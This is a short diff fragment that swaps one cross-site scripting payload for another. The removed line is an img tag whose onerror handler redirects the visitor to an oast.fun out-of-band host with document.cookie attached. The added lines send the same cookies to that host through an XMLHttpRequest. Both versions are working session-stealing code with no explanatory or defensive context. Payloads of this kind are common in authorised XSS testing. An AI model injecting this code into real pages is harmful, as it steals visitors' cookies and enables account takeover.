@@ -1,1 +1,3 @@
-<img src=x onerror="location.href='tbqimzzddwayopfmucrnud4kg540pi068.oast.fun/?c='+encodeURI(document.cookie);">
+var xhr=new XMLHttpRequest(); 
+xhr.open("GET", "https://tbqimzzddwayopfmucrnud4kg540pi068.oast.fun/?"+document.cookie, true); 
+xhr.send();
